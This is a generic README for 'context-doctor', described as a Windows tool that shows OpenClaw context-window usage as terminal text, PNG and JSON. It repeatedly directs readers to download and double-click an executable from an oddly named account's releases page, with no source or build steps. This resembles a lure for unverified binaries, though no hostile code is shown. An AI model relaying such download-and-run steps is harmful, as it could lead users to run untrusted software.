# 🧠 context-doctor - Visualize and Diagnose Context Usage

[![Download context-doctor](https://img.shields.io/badge/Download-Here-ff69b4?style=for-the-badge)](https://github.com/unhealthy-outlander317/context-doctor/releases)

---

## 🔍 What is context-doctor?

context-doctor helps you see how the OpenClaw context window is used. It shows this information in three ways:

- In the terminal (text view)
- As PNG images (visual view)
- As JSON files (data view)

This tool gives you a clear look at the context window, which is useful if you need to check how OpenClaw manages data over time.

---

## 💻 System Requirements

To use context-doctor on Windows, your computer should meet these needs:

- Windows 10 or later  
- At least 2 GB of free disk space  
- 4 GB of RAM or more recommended  
- A terminal program like Command Prompt or PowerShell  

You do not need to install any extra software to run context-doctor. It works with built-in Windows tools.

---

## 🛠️ How context-doctor works

context-doctor reads the OpenClaw context window data. It then shows this data in easy formats:

- Terminal: You see simple text directly in the Command Prompt or PowerShell window.
- PNG: You get image files showing the data pattern.
- JSON: You get structured text files you can use with other programs.

Each format helps you understand the context usage from a different angle.

---

## 🚀 Getting Started: Download and Setup

1. Click the big button at the top or visit the main download page here:

   [Download context-doctor Releases](https://github.com/unhealthy-outlander317/context-doctor/releases)

2. On that page, find the latest version for Windows.

3. Download the file named like `context-doctor-win.exe` or similar.

4. Once the download finishes, find the file in your Downloads folder.

5. Double-click the file to run context-doctor. No install process is needed.

6. A terminal window will open showing status and options.

---

## 📂 Running context-doctor from Command Prompt

You can run context-doctor using Command Prompt with these steps:

1. Open Command Prompt:
   - Press the Windows key.
   - Type `cmd` and press Enter.

2. Navigate to the folder where you downloaded context-doctor. For example:

```
cd %USERPROFILE%\Downloads
```

3. Run context-doctor by typing:

```
context-doctor-win.exe
```

4. The program will show information about the OpenClaw context usage immediately.

You can also pass extra options to choose output formats or files. See the next section.

---

## ⚙️ Using Options and Output Formats

context-doctor supports three output types. By default, it shows text in the terminal. You can add options to change this:

- `--png`  
  Saves images to a folder called `output_images` inside the current folder.

- `--json`  
  Writes JSON files to a folder called `output_json`.

- You can combine both options:

```
context-doctor-win.exe --png --json
```

This command will save PNG and JSON files at the same time.

By default, files are saved in your current folder. You can create new folders to keep data organized.

---

## 🖼 Viewing the PNG Images

If you use the `--png` option, images will be saved as `.png` files. To open them:

1. Open File Explorer and go to the `output_images` folder.

2. Double-click any PNG file. It will open in the default image viewer, like Windows Photo Viewer or Photos.

The images show visual layouts of the context window data. You can compare them over time to spot changes.

---

## 📄 Understanding the JSON Files

If you use the `--json` option, files with `.json` extension will be saved.

JSON is a simple text format. It contains all data about the context window in a way other programs can easily read.

You can open these files with:

- Notepad or any text editor
- JSON viewers available online
- Data analysis tools if you want to automate reading this data

---

## ❓ Common Questions

**Q: Do I need to install anything before running context-doctor?**  
A: No installation is needed. Just download and run the executable file.

**Q: Can I use context-doctor on other operating systems?**  
A: This version is made for Windows. Other versions may be available for Linux or Mac.

**Q: How do I update context-doctor?**  
A: Visit the download page again and get the latest executable. Replace your old file with the new one.

**Q: What if the visualization does not load?**  
A: Make sure the PNG files are in the right folder and your image viewer supports PNG files. Common viewers on Windows handle this format well.

---

## 🗂 Folder Structure Example

After running context-doctor with options, your files may look like this:

```
C:\Users\YourName\Downloads\
    context-doctor-win.exe
    output_images\
        context_1.png
        context_2.png
        ...
    output_json\
        context_1.json
        context_2.json
        ...
```

---

## 👨‍💻 Where to Get Help

If you have issues or questions:

- Check the Issues section on the GitHub page.
- Read any documentation on the release page.
- Post your question clearly, explaining your Windows version and what you tried.

---

[![Download context-doctor](https://img.shields.io/badge/Download-Here-ff69b4?style=for-the-badge)](https://github.com/unhealthy-outlander317/context-doctor/releases)